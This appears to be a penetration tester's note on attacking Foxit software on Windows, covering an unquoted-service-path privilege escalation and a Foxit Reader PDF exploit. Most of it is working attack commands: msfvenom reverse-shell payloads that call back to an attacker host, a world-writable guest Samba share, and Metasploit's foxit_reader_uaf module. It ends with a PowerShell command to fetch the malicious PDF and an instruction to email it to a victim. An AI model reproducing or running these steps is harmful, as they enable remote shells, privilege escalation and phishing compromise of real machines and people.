#### Unquoted Service Path
https://www.exploit-db.com/exploits/36390

In winpeas.txt, we see the service name right above the unquoted service path:

![[Pasted image 20220321181308.png]]

```command prompt - windows 
sc qc FoxitCloudUpdateService
```

We see that are no quotes around the bin path line.

![[Pasted image 20220320180823.png]]

We can now start testing where in this path we have write privileges.  Tested an echo command in Program Files x86,  we get access denied.  Tested in Foxit Software, we are successful at writing out test file. 

```command prompt - windows
echo "test" > test.txt
```

We place our malicious Foxit.exe file in the Foxit Reader directory.

```bash - kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=80 -f exe -o Foxit.exe
```

![[4._File Transfers#Certutil]]

![[___.Misc Commands#Restart host]]


#### PDF EXE

[https://prog.world/we-exploit-the-foxit-reader-vulnerability-and-bypass-the-digital-signature-on-the-example-of-the-neoquest-2020-task/](https://prog.world/we-exploit-the-foxit-reader-vulnerability-and-bypass-the-digital-signature-on-the-example-of-the-neoquest-2020-task/)

```bash - kali
sudo apt install samba
```

```bash - kali
sudo mkdir /mnt/files
```

```bash - kali
sudo chmod 777 /mnt/files
```

Now you need to configure the samba server. To do this, open the configuration file /etc/samba/smb.conf and paste the following text there:

```bash - kali
mousepad /etc/samba/smb.conf
```

```bash - kali
[global]  
security = user  
workgroup = MYGROUP  
server string = Samba  
guest account = nobody  
map to guest = Bad User

[share]  
path = /mnt/files  
browseable = Yes  
guest ok = Yes  
writeable = Yes  
public = yes  
```

```bash - kali
sudo service smbd restart
```

```bash - kali
sudo service nmbd restart
```

```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=80 --arch x86 -f exe -o /mnt/files/exploit.exe
```

```bash - kali
sudo chmod 777 /mnt/files/exploit.exe
```

```bash - kali
sudo msfdb run
```

```bash - kali
use exploit/windows/fileformat/foxit_reader_uaf
```

```bash - kali
set LHOST $KALI
```

```bash - kali
set EXENAME exploit.exe
```

```bash - kali
set SHARE share
```

```bash - kali
run
```

```bash - kali
sudo cp /root/.msf4/local/test.pdf .
```


![[Python#Server]]

![[rlwrap]]

Download update.pdf on already compromised machine (if you have one), then use email app to send to victim:
```powershell - target
powershell -c "(new-object System.Net.WebClient).DownloadFile('$KALI:80/test.pdf','C:/Users/$USER/Documents/tools/update.pdf')"
```